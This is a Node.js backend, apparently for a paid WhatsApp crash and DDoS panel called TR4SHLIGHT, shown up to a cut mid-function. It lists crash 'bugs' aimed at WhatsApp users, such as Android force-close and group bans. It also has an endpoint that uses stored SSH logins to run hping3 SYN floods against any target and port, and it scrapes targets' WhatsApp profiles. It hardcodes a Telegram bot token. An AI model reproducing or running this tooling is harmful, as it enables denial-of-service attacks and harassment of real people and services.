const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});
process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});
// ── STARTUP: Generate pairId untuk semua user yang belum punya ───────────────
(function generateAllPairIds() {
  try {
    const db = loadDatabase();
    let changed = false;
    for (let i = 0; i < db.length; i++) {
      if (!db[i].pairId) {
        db[i].pairId = genPairId();
        changed = true;
        console.log(`[STARTUP] pairId generated: ${db[i].username} → ${db[i].pairId}`);
      }
    }
    if (changed) {
      saveDatabase(db);
      console.log(`[STARTUP] pairId generation done for ${db.filter(u => u.pairId).length} users`);
    } else {
      console.log(`[STARTUP] All users already have pairId`);
    }
  } catch(e) {
    console.error('[STARTUP] pairId generation error:', e.message);
  }
})();

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    fetchLatestBaileysVersion,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const fsPromises = require('fs').promises;
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const mongoose = require('mongoose');
const multer = require('multer');
const cors = require('cors');
const http = require('http');
const bodyParser = require('body-parser');
const AdmZip = require('adm-zip'); // Ganti pake adm-zip
const archiver = require('archiver')('zip', { zlib: { level: 9 } });
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
let wsClients = {};
let chatList = [];
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
const SESSION_PATH = path.join(__dirname, "permenmd");
const THIRTY_MINUTES = 30 * 60 * 1000;
const qrCodes = {};
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
  { bug_id: "delay", bug_name: "DELAY HARD BY DANZ" },
  { bug_id: "freezexdelay", bug_name: "FREEZE LAG X DELAY" },
  { bug_id: "forclose", bug_name: "FORCLOSE ANDROID" },
  { bug_id: "crashclick", bug_name: "CRASH CLICK" }, 
  { bug_id: "delay", bug_name: "DELAY VISIBLE" }, 
  { bug_id: "buldo", bug_name: "BULDOZER" },
  { bug_id: "fc_group", bug_name: "FC NO CLICK" }, 
  { bug_id: "ban_group", bug_name: "BANNED GROUP" }
];
let cncActive = true;
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});

if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .slice(0, 250);
}

const TOKEN = "8671542785:AAG3flVNz-h4dhKsbAzK7eWjkaijLcDo-9k";
const bot = new TelegramBot(TOKEN, {
 polling: {
  interval: 300,
  autoStart: true,
  params: {
   timeout: 10
  }
 }
});

const ID_GROUP = [
    -1003761812354
];

const ID_GROUP_UTAMA = [
    -1003761812354
];


function readRat(f) {
  try { return JSON.parse(fs.existsSync(f) ? fs.readFileSync(f,'utf8')||'[]' : '[]'); } catch { return []; }
}
function saveRat(f,d) { try { fs.writeFileSync(f, JSON.stringify(d,null,2)); } catch(_) {} }

// =======================================================
// KONFIGURASI STORAN FEE
// =======================================================
const SELLER_STORANS_FILE = path.join(__dirname, 'seller_storans.json');
const SELLER_UPLOADS_DIR = path.join(__dirname, 'uploads', 'seller-storans');
const PAYMENT_FILE = path.join(__dirname, 'payment.json'); // File untuk setting rekening

if (!fs.existsSync(SELLER_UPLOADS_DIR)) fs.mkdirSync(SELLER_UPLOADS_DIR, { recursive: true });

// Multer khusus untuk menangkap 2 foto sekaligus dari Flutter
const sellerStoranUpload = multer({
  storage: multer.diskStorage({
    destination: (_req, _file, cb) => cb(null, SELLER_UPLOADS_DIR),
    filename: (_req, file, cb) => {
      const ext = path.extname(file.originalname || '.jpg').toLowerCase() || '.jpg';
      const tag = file.fieldname === 'proof_fee' ? 'fee' : 'buyer';
      cb(null, `${tag}-${Date.now()}-${crypto.randomBytes(4).toString('hex')}${ext}`);
    }
  }),
  limits: { fileSize: 8 * 1024 * 1024 },
  fileFilter: (_req, file, cb) => {
    const ext = path.extname(file.originalname || '').toLowerCase();
    const extOk = ['.jpg', '.jpeg', '.png', '.webp'].includes(ext);
    cb(extOk ? null : new Error('Hanya file gambar yang diizinkan'), extOk);
  }
});
// =======================================================
// HELPER STORAN FEE
// =======================================================
function loadSellerStorans() {
  try { return JSON.parse(fs.readFileSync(SELLER_STORANS_FILE, 'utf8')); } 
  catch { return {}; }
}
function saveSellerStorans(items) {
  fs.writeFileSync(SELLER_STORANS_FILE, JSON.stringify(items, null, 2));
}

// Ambil config rekening (DANA/GoPay/QRIS) dari payment.json
function getSellerStoranPayment() {
  let cfg = {};
  try { 
    cfg = fs.existsSync(PAYMENT_FILE) ? JSON.parse(fs.readFileSync(PAYMENT_FILE, 'utf8')) : {}; 
  } catch (e) {
    console.error('[PAYMENT] Gagal baca payment.json:', e.message);
  }
  
  const pp = cfg.personalPayment || {};
  const storanCfg = cfg.sellerStoran || {};
  const methods = [];

  // 1. Ambil custom methods dari sellerStoran.methods (kalau kamu isi manual di payment.json)
  for (const m of (storanCfg.methods || [])) {
    if (!m || !String(m.number || '').trim()) continue;
    methods.push({ 
      label: m.label || 'Transfer', 
      number: String(m.number).trim(), 
      name: m.name || '', 
      note: m.note || '' 
    });
  }

  // 2. Auto-generate DANA dari personalPayment
  if (pp.danaNumber) {
    methods.push({ 
      label: 'DANA', 
      number: pp.danaNumber, 
      name: pp.danaAccountName || '', 
      note: 'Transfer storan fee ke DANA' 
    });
  }

  // 3. Auto-generate GoPay dari personalPayment
  if (pp.gopayNumber) {
    methods.push({ 
      label: 'GoPay', 
      number: pp.gopayNumber, 
      name: pp.gopayAccountName || '', 
      note: 'Transfer storan fee ke GoPay' 
    });
  }

  // 4. Auto-generate QRIS/QR dari personalPayment
  if (pp.qrImageUrl) {
    methods.push({ 
      label: 'QRIS', 
      number: pp.qrImageUrl, 
      name: pp.qrAccountName || '', 
      note: 'Scan QR untuk transfer storan fee' 
    });
  }

  return {
    fee: Number(storanCfg.fee) || 5000,
    note: storanCfg.note || (methods.length ? 'Transfer sesuai nominal storan fee lalu upload bukti.' : ''),
    methods,
    configured: methods.length > 0
  };
}
// Kirim 2 foto ke Telegram
async function notifySellerStoranToTelegram(id, item) {
  const keyboard = {
    inline_keyboard: [[
      { text: '✅ ACC', callback_data: `seller_approve:${id}` },
      { text: '❌ TOLAK', callback_data: `seller_reject:${id}` }
    ]]
  };

  const captionFee = `🧾 *BUKTI STORAN FEE — MENUNGGU ACC*\n\n👤 Seller: \`${item.submittedBy}\` _(${item.submittedRole})_\n📦 Barang: ${item.role}\n👥 Target: \`${item.username}\`\n💰 Fee: Rp ${item.feeAmount.toLocaleString('id-ID')}\n🆔 ID: \`${id}\`\n\n_Klik ✅ ACC jika kedua bukti valid._`;
  const captionBuyer = `📎 *BUKTI TF BUYER*\nID: \`${id}\` · ${item.role} · Seller: @${item.submittedBy}`;

  try {
    if (item.proofBuyerPath && fs.existsSync(item.proofBuyerPath)) {
      await bot.sendPhoto(ID_GROUP_UTAMA[0], item.proofBuyerPath, { caption: captionBuyer, parse_mode: 'Markdown' });
    }
    if (item.proofFeePath && fs.existsSync(item.proofFeePath)) {
      await bot.sendPhoto(ID_GROUP_UTAMA[0], item.proofFeePath, { caption: captionFee, parse_mode: 'Markdown', reply_markup: keyboard });
    } else {
      await bot.sendMessage(ID_GROUP_UTAMA[0], captionFee, { parse_mode: 'Markdown', reply_markup: keyboard });
    }
  } catch (e) {
    console.error('[STORAN] Gagal kirim TG:', e.message);
  }
}

// Logic ACC (Dipanggil oleh tombol Telegram)
function approveSellerStoran(id, reviewedBy = 'telegram') {
  const items = loadSellerStorans();
  const item = items[id];
  if (!item || item.status === 'approved') return { ok: false, error: 'Sudah diproses' };

  const db = loadDatabase();
  if (db.find(u => u.username === item.username)) return { ok: false, error: 'Username sudah ada' };

  // Buat akun sesuai format database.json yang baru
  const newAccount = {
    username: item.username,
    password: item.password,
    expiredDate: '2099-12-31', // Permanent
    role: item.role,
    pairId: genPairId(),
  };

  db.push(newAccount);
  saveDatabase(db);

  item.status = 'approved';
  item.reviewedAt = new Date().toISOString();
  item.reviewedBy = reviewedBy;
  items[id] = item;
  saveSellerStorans(items);

  sendToGroupsUtama(`✅ *AKUN STORAN DI-ACC*\n\nUsername: ${item.username}\nRole: ${item.role}\nDibuat oleh: ${item.submittedBy}`, { parse_mode: 'Markdown' });

  return { ok: true, item };
}

// Logic TOLAK (Dipanggil oleh tombol Telegram)
function rejectSellerStoran(id, reviewedBy = 'telegram', reason = '') {
  const items = loadSellerStorans();
  const item = items[id];
  if (!item || item.status === 'approved') return { ok: false, error: 'Sudah diproses' };

  item.status = 'rejected';
  item.reviewedAt = new Date().toISOString();
  item.reviewedBy = reviewedBy;
  item.rejectReason = reason || 'Ditolak admin';
  items[id] = item;
  saveSellerStorans(items);

  return { ok: true, item };
}
// Ambil config rekening dari payment.json (SESUAIKAN DENGAN FORMAT KAMU)
function sendToGroups(text, options = {}) {
    for (const groupid of ID_GROUP) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}

function sendToGroupsUtama(text, options = {}) {
    for (const groupid of ID_GROUP_UTAMA) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}

async function appendLogAsync(filePath, data) {
  try {
    if (fs.existsSync(filePath)) {
      const stats = fs.statSync(filePath);
      if (stats.size > 5 * 1024 * 1024) {
        fs.writeFileSync(filePath, '');
      }
    }
    await fsPromises.appendFile(filePath, data);
  } catch (err) {
    console.error(`[❌ LOG ERROR] Gagal menulis log: ${err.message}`);
  }
}

const OWNER_ID = 8524777510;

// TAMBAHKAN BARIS INI:
const config = JSON.parse(fs.readFileSync('telegram.json', 'utf8'));

async function autoRefresh() {
  try {
    if (!fs.existsSync(SESSION_PATH)) {
      console.log("⚠️ Folder 'permenmd' tidak ditemukan.");
    } else {
      let deletedCount = 0;
      const userFolders = fs.readdirSync(SESSION_PATH);

      for (const userFolder of userFolders) {
        const userPath = path.join(SESSION_PATH, userFolder);
        if (!fs.lstatSync(userPath).isDirectory()) continue;

        const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
        if (!hasJson) {
          fs.rmSync(userPath, { recursive: true, force: true });
          deletedCount++;
        }
      }
      console.log(`[AUTO REFRESH] ${deletedCount} folder session kosong dihapus.`);
    }

    console.log("[AUTO REFRESH] Auto restart dijalankan...");

    setTimeout(() => {
      console.log("[AUTO REFRESH] Server aktif dan berjalan normal setelah auto restart.");
    }, 8000);

    setTimeout(() => {
      console.log("[AUTO REFRESH] Process restart server");
      process.exit(0);
    }, 5000);

  } catch (err) {
    console.error("[AUTO REFRESH] Error", err);
  }
}

const LOGS_DIR = path.join(__dirname, 'user_logs');

function genPairId() {
  return crypto.randomBytes(8).toString('hex').toUpperCase();
}

const devicePermFile = './device_perms.json';
function loadDevicePerms() {
  try {
    if (require('fs').existsSync(devicePermFile)) {
      return JSON.parse(require('fs').readFileSync(devicePermFile, 'utf8'));
    }
  } catch(e) {}
  return {};
}
function saveDevicePerms(data) {
  require('fs').writeFileSync(devicePermFile, JSON.stringify(data, null, 2));
}

function hapusIsiUserLogs() {
  if (!fs.existsSync(LOGS_DIR)) {
    console.log("[AUTOCLEAN LOGS] Folder tidak ditemukan");
    return;
  }

  const files = fs.readdirSync(LOGS_DIR);

  for (const file of files) {
    const filePath = path.join(LOGS_DIR, file);
    fs.rmSync(filePath, { recursive: true, force: true });
  }

  console.log("[AUTOCLEAN LOGS] Isi folder berhasil dihapus");
}

if (!fs.existsSync(LOGS_DIR)) {
  fs.mkdirSync(LOGS_DIR, { recursive: true });
  console.log("[LOGS] Folder 'user_logs' dibuat.");
}

function saveUserLog(username, type, title, description) {
  try {
    const userLogPath = path.join(LOGS_DIR, `${username}.json`);
    let logs = [];

    if (fs.existsSync(userLogPath)) {
      logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));
    }

    logs.push({
      type: type,
      title: title,
      description: description,
      timestamp: Date.now()
    });

    fs.writeFileSync(userLogPath, JSON.stringify(logs, null, 2));
    console.log(`[LOGS] Activity saved for ${username}: ${type}`);
  } catch (err) {
    console.error(`[LOGS] Gagal simpan log ${username}:`, err.message);
  }
}

wss.on('connection', function (ws, req) {
  let username;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

      // ==========================================
      // 1. SESSION CHECK
      // ==========================================
      if (data.type === 'sessionCheck') {
        const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const user = sessionList.find(e => e.sessionKey === data.key);

        if (!user) {
          ws.send(JSON.stringify({ type: "forceLogout", reason: "Invalid key" }));
          return ws.close();
        }

        if (user.androidId !== data.androidId) {
          ws.send(JSON.stringify({ type: "forceLogout", reason: "Another device has logged in" }));
          return ws.close();
        }
      }

      // ==========================================
      // 2. VALIDATE & INTERVAL CHECK
      // ==========================================
      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key);
        const validId = session.find(e => e.androidId === data.androidId);

        if (!validKey) {
          ws.send(JSON.stringify({ type: "myInfo", valid: false, reason: "keyInvalid" }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({ type: "myInfo", valid: false, reason: "androidIdMismatch" }));
          return ws.close();
        }

        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: session.username,
          androidId: session.androidId,
          role: session.role || "member"
        }));

        const interval = setInterval(() => {
          try {
            const sess = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
            const vk = sess.find(e => e.sessionKey === data.key);
            const vi = sess.find(e => e.androidId === data.androidId);

            if (!vk) {
              ws.send(JSON.stringify({ type: "myInfo", valid: false, reason: "keyInvalid" }));
              return ws.close();
            }
            if (!vi) {
              ws.send(JSON.stringify({ type: "myInfo", valid: false, reason: "androidIdMismatch" }));
              return ws.close();
            }
          } catch (e) {
            console.error("[Validate Interval Error]", e.message);
          }
        }, 10000);
      }

      // ==========================================
      // 3. REAL-TIME STATS (UNTUK FLUTTER DASHBOARD)
      // ==========================================
      if (data.type === 'stats') {
        let totalUser = 0;
        let activeConnCount = 0;
        let memoryPercent = 0;
        let uptimeStr = "0s";

        try {
          // --- HITUNG TOTAL USERS ---
          if (fs.existsSync("database.json")) {
            const users = JSON.parse(fs.readFileSync("database.json", "utf8"));
            totalUser = Array.isArray(users) ? users.length : Object.keys(users).length;
          }

          // --- HITUNG ACTIVE CONNECTIONS (SENDER) ---
          const baseDir = 'permenmd';
          if (fs.existsSync(baseDir)) {
            const allUsers = fs.readdirSync(baseDir).filter(p => {
              const pPath = path.join(__dirname, baseDir, p);
              return fs.lstatSync(pPath).isDirectory();
            });

            allUsers.forEach(u => {
              const uPath = path.join(__dirname, baseDir, u);
              if (fs.existsSync(uPath)) {
                const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
                files.forEach(f => {
                  const sessionName = path.basename(f, ".json");
                  // Pastikan activeConnections bisa diakses
                  if (typeof activeConnections !== 'undefined' && activeConnections[sessionName]) {
                    activeConnCount++;
                  }
                });
              }
            });
          }

          // --- HITUNG MEMORY & UPTIME PROSES NODE.JS ---
          const mem = process.memoryUsage();
          memoryPercent = parseFloat(((mem.heapUsed / mem.heapTotal) * 100).toFixed(2));
          
          // Jika kamu punya fungsi formatUptime terpisah, kamu bisa ganti bagian bawah ini dengan memanggil fungsi tersebut
          const uptimeSec = process.uptime();
          const days = Math.floor(uptimeSec / 86400);
          const hours = Math.floor((uptimeSec % 86400) / 3600);
          const minutes = Math.floor((uptimeSec % 3600) / 60);
          const seconds = Math.floor(uptimeSec % 60);
          uptimeStr = `${days}d ${hours}h ${minutes}m ${seconds}s`;

        } catch (err) {
          console.error("[WS STATS ERROR]", err.message);
        }

        // --- KIRIM DATA KE FLUTTER ---
        ws.send(JSON.stringify({
          type: 'stats',
          onlineUsers: Object.keys(typeof wsClients !== 'undefined' ? wsClients : {}).length || 0,
          totalUsers: totalUser,
          activeConnections: activeConnCount,
          uptime: uptimeStr,
          uptimePercent: 99.9, // Static, atau buat logic pengecekan ping jika ada
          memory: memoryPercent
        }));
      }

      // ==========================================
      // 4. AUTH CHAT
      // ==========================================
      if (data.type === 'auth') {
        username = getUserByKey(data.key);
        console.log(username);
        if (!username) return ws.close();
        wsClients[username] = ws;

        const list = chatList
          .filter(m => m.from === username || m.to === username)
          .map(m => (m.from === username ? m.to : m.from));

        ws.send(JSON.stringify({
          type: "chatList",
          users: [...new Set(list)],
        }));
      }

      // ==========================================
      // 5. CHAT MESSAGE
      // ==========================================
      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
        if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      // ==========================================
      // 6. GET MESSAGES HISTORY
      // ==========================================
      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }

    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

const wsPort = 3778;
server.listen(wsPort, () => {
  console.log(`🟣 Server running on http://node.whoo.cata.web.id:${wsPort}`);
});

const PORT = 3778;

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData);

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000;

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}

function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end();
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
  connectToAllVPS();
}

fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
    connectToAllVPS();
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

const news = [
  {
    image: "https://files.catbox.moe/i8vtsd.png",
    title: "TR4SHLIGHT",
    desc: "CREDIT BY Danzotwdev"
  }
];

app.get("/getMyActivity", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });

  const username = keyInfo.username;
  const userLogPath = path.join(LOGS_DIR, `${username}.json`);

  try {
    if (!fs.existsSync(userLogPath)) {
      return res.json({ valid: true, activities: [] });
    }

    const logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));

    logs.sort((a, b) => b.timestamp - a.timestamp);

    return res.json({ valid: true, activities: logs });
  } catch (err) {
    console.error("[GET LOGS ERROR]", err.message);
    return res.status(500).json({ valid: false, message: "Gagal mengambil log" });
  }
});

// ===== Endpoint: Login & Key Fetch (version 3.0 required) =====
app.post("/validate", (req, res) => {
const { username, password, version, androidId } = req.body;

if (!androidId) {
  return res.json({ valid: false, message: "androidId required" });
}

const db = loadDatabase();
const userIdx = db.findIndex(u => u.username === username && u.password === password);
const user = db[userIdx];

if (!user) return res.json({ valid: false });

// Auto-generate pairId kalau belum ada
if (!user.pairId) {
  user.pairId = genPairId();
  db[userIdx] = user;
  saveDatabase(db);
}

if (isExpired(user)) {
  return res.json({ valid: true, expired: true });
}

// Cek apakah device sama
const keyList = loadKeyList();
const existingSession = keyList.find(e => e.username === username);
if (existingSession && existingSession.androidId !== androidId) {
  // device berbeda, override
